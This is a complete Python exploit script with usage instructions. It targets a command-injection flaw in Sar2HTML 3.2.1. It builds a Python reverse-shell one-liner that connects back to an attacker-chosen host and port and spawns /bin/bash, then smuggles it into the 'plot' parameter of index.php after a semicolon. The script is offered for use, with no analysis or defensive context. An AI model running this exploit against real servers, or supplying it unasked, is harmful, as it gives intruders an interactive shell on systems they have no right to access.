#!/usr/bin/python3
'''
Get a reverse shell by exploiting RCE vuln in Sar2HTML 3.2.1

Usage
=====
chmod +x exploit.py
./exploit.py web_url listening_host listening_port
./exploit.py http://localhost/ 127.0.0.1 1234
'''

import requests,sys
args=sys.argv
url = args[1]
lhost = args[2]
lport = args[3]

cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
print('sending request')
requests.get(f"{url}/index.php?plot=;{cmd}")
